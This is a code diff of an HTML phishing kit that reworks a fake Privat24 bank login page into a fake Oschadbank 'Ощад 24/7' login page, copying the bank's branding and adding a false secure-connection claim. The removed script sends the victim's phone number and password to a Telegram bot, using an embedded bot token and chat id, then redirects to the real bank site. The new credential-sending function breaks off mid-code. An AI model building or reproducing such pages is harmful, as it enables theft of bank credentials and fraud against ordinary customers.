@@ -1,32 +1,60 @@
 <!DOCTYPE html>
-<html>
+<html lang="uk">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Приват24 — Вхід</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Ощад 24/7 — Вхід</title>
     <style>
-        body { margin: 0; background: #f6f6f6; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; padding-top: 50px; }
-        .card { width: 90%; max-width: 360px; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; }
-        .logo { font-size: 30px; font-weight: bold; color: #71bb00; margin-bottom: 30px; }
-        .logo span { color: #333; }
-        input { width: 100%; padding: 15px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; font-size: 16px; }
-        .btn { width: 100%; padding: 15px; background: #71bb00; color: #fff; border: none; border-radius: 5px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        body { margin: 0; background-color: #f4f7f6; font-family: 'Segoe UI', Roboto, sans-serif; display: flex; flex-direction: column; align-items: center; }
+        .header { width: 100%; background: #004a34; padding: 20px 0; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
+        .logo-text { color: #ffffff; font-size: 24px; font-weight: bold; letter-spacing: 1px; }
+        .logo-text span { color: #ffcb05; } /* Золотистий акцент */
+        
+        .login-container { width: 90%; max-width: 380px; background: #ffffff; margin-top: 40px; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); box-sizing: border-box; }
+        h2 { color: #333; font-size: 22px; margin-bottom: 25px; text-align: center; font-weight: 500; }
+        
+        .input-group { margin-bottom: 20px; text-align: left; }
+        label { display: block; margin-bottom: 8px; color: #666; font-size: 14px; }
+        input { width: 100%; padding: 14px; border: 1px solid #ccd1d0; border-radius: 6px; font-size: 16px; box-sizing: border-box; outline: none; transition: border 0.3s; }
+        input:focus { border-color: #004a34; }
+        
+        .btn-login { width: 100%; padding: 15px; background: #004a34; color: #fff; border: none; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; transition: background 0.3s; }
+        .btn-login:hover { background: #003626; }
+        
+        .footer { margin-top: 30px; font-size: 13px; color: #999; text-align: center; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <div class="logo">Privat<span>24</span></div>
-        <input type="text" id="l" placeholder="Номер телефону">
-        <input type="password" id="p" placeholder="Пароль">
-        <button class="btn" onclick="send()">Увійти</button>
+
+    <div class="header">
+        <div class="logo-text">ОЩАД<span>24/7</span></div>
     </div>
+
+    <div class="login-container">
+        <h2>Вхід до системи</h2>
+        
+        <div class="input-group">
+            <label>Логін або номер телефону</label>
+            <input type="text" id="username" placeholder="Введіть ваш логін">
+        </div>
+        
+        <div class="input-group">
+            <label>Пароль</label>
+            <input type="password" id="password" placeholder="Введіть пароль">
+        </div>
+        
+        <button class="btn-login" onclick="sendOschad()">УВІЙТИ</button>
+        
+        <div class="footer">
+            Захищене з'єднання SSL<br>
+            © АТ «Ощадбанк»
+        </div>
+    </div>
+
     <script>
-        function send() {
-            const log = document.getElementById('l').value;
-            const pas = document.getElementById('p').value;
-            fetch(`https://api.telegram.org/bot8790499217:AAFZF8O15FpKe0-z_4P3q9FkedSnGdzB_o8/sendMessage?chat_id=8491881282&text=${encodeURIComponent("🏦 ПРИВАТ:\n👤 L: "+log+"\n🔑 P: "+pas)}`, {mode: 'no-cors'});
-            setTimeout(() => { window.location.href="https://next.privat24.ua/"; }, 1000);
-        }
-    </script>
-</body>
-</html>
+        function sendOschad() {
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            
+            if(user === "" || pass === "") {
+
